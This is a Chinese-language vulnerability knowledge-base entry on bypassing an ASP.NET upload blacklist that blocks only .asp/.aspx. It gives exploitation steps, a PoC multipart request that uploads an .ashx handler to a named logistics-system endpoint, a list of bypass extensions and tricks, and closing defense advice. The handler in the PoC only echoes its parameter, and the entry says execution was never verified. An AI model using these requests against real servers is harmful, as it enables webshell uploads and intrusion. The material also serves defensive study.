---
id: web-generic-file-upload-dotnet-blacklist-only-asp-aspx
title: .NET MVC 上传黑名单只拦 .asp/.aspx：.ashx/.cshtml/.asmx 等 IIS 可解析扩展绕过
type: scenario
domain: web
path: web/generic/file-upload
technique: dotnet-upload-blacklist-only-asp-aspx
aliases:
- UploadFile LoadFile
- PcHeadEdit_LTJY
- 只拦 asp aspx
- ashx 上传
- IIS 可解析扩展
tags:
- web
- dotnet
- aspnet
- file-upload
- blacklist-bypass
- webshell
- iis
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V204
  verified_at: '2026-11-07T02:40:41+08:00'
  notes: 已对照原文与 8 张图片核对；黑名单与 SaveAs 路径一致；原文仅验证 .html 上传访问，未验证 .ashx 执行
---

## 一句话结论

某物流系统 MVC 控制器的 `UploadFile` 只把扩展名转小写后与 `.asp`/`.aspx` 比较，其他扩展一律放行，并用 `SaveAs` 写入 `~/UploadFiles/MsOpFiles/<BillNo>/<usercode+timestamp+filename>`；上传 `.ashx`/`.cshtml`/`.asmx`/`.cer`/`.soap` 等 IIS 可解析扩展即可绕过黑名单，落地到 Web 可访问目录后执行（文章仅实际验证了 `.html` 上传与访问，未执行 webshell 扩展）。

## 原理

- 关键校验：`string text2 = Path.GetExtension(httpPostedFileBase.FileName).ToLower(); if (text2 == ".asp" || text2 == ".aspx") { 拒绝 }`。黑名单只覆盖两个扩展，ASP.NET/IIS 还支持 `.ashx`（一般处理程序）、`.asmx`（Web Service）、`.cshtml`（Razor）、`.asax`、`.ascx`、`.cer`、`.soap`、`.config` 等，均可绕过。
- 路径构造：`text3 = Server.MapPath("~/UploadFiles/MsOpFiles/" + text)`，其中 `text = Request.Form["BillNo"]`；先删除该目录下已有文件/子目录，再按需创建；文件名 `text4 = Session["USERCODE"] + DateTime.Now.ToString("yyyyMMddHHmmssfff") + fileName`；最终 `httpPostedFileBase.SaveAs(text5)`。
- 保存目录在站点内，响应 JSON 的 `data` 字段直接返回落盘绝对路径，对应 URL 为 `/UploadFiles/MsOpFiles/<文件名>`，因此上传的脚本可被 HTTP 访问。
- 为什么能执行：IIS 按扩展名映射到 ASP.NET handler；`.ashx`/`.asmx` 默认常启用，`.cshtml` 需 Razor 支持；若目录未禁止脚本执行，上传内容即被服务端解析。即使脚本 handler 不可用，`.html`/`.svg` 也可用于存储型 XSS，`.config` 可用于配置攻击。
- 入口有 Session 门槛（`COMPANYID`/`USERID`/`CODENAME`/`SHOWNAME`/`DEPTNAME` 非空），因此需要登录态；若存在会话伪造/默认口令，可进一步扩大。

## 触发条件

- ASP.NET MVC 控制器使用 `Request.Files["LoadFile"]` 接收文件，扩展名校验为“只拒绝 .asp/.aspx”的黑名单。
- 使用 `SaveAs` 把用户文件写入站点可访问目录，且文件名/目录部分可控。
- IIS/.NET 对 `.ashx`/`.asmx`/`.cshtml` 等扩展启用了对应 handler；上传目录允许执行脚本。
- 攻击者能获得有效 Session（登录、默认口令或会话伪造）。

## 利用步骤

1. 登录系统获得 Session；确认上传入口与表单字段名（`LoadFile`、`BillNo`）。
2. 构造 multipart 请求，文件名用 `.ashx`（或 `.asmx`/`.cshtml`），内容为对应 handler/WebService/Razor 脚本。
3. 发送 `POST /TruckMng/PcHeadEdit_LTJY/UploadFile`，从 JSON `data` 读取落盘路径。
4. 访问 `/UploadFiles/MsOpFiles/<文件名>`，确认脚本执行。
5. 若 `.ashx` 被内容检测拦截，换 `.asmx`、`.cshtml`、`.cer`、`.soap`、`.config` 或先上传 `.html`/`.svg` 做 XSS。

## PoC

```http
POST /TruckMng/PcHeadEdit_LTJY/UploadFile HTTP/1.1
Host: target
Cookie: ASP.NET_SessionId=<session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryX

------WebKitFormBoundaryX
Content-Disposition: form-data; name="BillNo"

20250821
------WebKitFormBoundaryX
Content-Disposition: form-data; name="LoadFile"; filename="x.ashx"
Content-Type: application/octet-stream

<%@ WebHandler Language="C#" Class="H" %>
using System.Web;
public class H : IHttpHandler {
  public void ProcessRequest(HttpContext c) { c.Response.Write(c.Request["cmd"]); }
  public bool IsReusable { get { return false; } }
}
------WebKitFormBoundaryX--
```

```http
GET /UploadFiles/MsOpFiles/202508212206450861x.ashx?cmd=whoami HTTP/1.1
Host: target
```

说明：文章实际验证的是上传 `1.html` 并访问显示 `test`，未执行 `.ashx`；RCE 结论基于 IIS 扩展映射与代码路径，需在目标环境确认 handler/目录执行权限。`BillNo` 被拼进 `Server.MapPath("~/UploadFiles/MsOpFiles/" + text)`，若未过滤 `../` 可能影响落盘目录，文章未测试。

## 变体与关联

- **完全无 extensions 校验**：物流系统同类入口直接按原文件名保存 `.aspx`/`.ashx`；见 [[web-generic-file-upload-dongsheng-logistics-extension-no-check]]。
- **通用后缀绕过**：大小写、双写、点/空格、`%00`、`::$DATA`；见 [[web-generic-file-upload-weak-suffix-bypass]]、[[web-generic-file-upload-blacklist-double-write-bypass]]。
- **ASP.NET 头像/图片上传改 aspx**：见 [[web-generic-file-upload-aspnet-avatar-extension-aspx-webshell]]、[[web-generic-file-upload-dotnet-uploadpicture-aspx-webshell]]。
- **IIS 解析特性**：`.config` 可被下载/解析、`.cer`/`.soap` 等映射依服务器配置；先枚举允许的 handler。

## 检测与防御

- 使用扩展名白名单（只允许业务需要的图片/文档类型），而不是黑名单；同时校验 Content-Type、魔数、文件内容，并重命名。
- 上传目录移出 Web 根，或禁止脚本执行（IIS 请求筛选/处理程序映射）；禁止 `.ashx`/`.asmx`/`.cshtml` 等可执行扩展落盘。
- 文件名/目录参数做 `Path.GetFileName` 与规范化校验，防止路径穿越；Session 校验之外增加权限与 CSRF 防护。
- 检测：上传请求文件名扩展不在业务白名单、响应返回站点内路径、上传目录出现脚本文件；IIS 日志中出现对新上传脚本的访问。
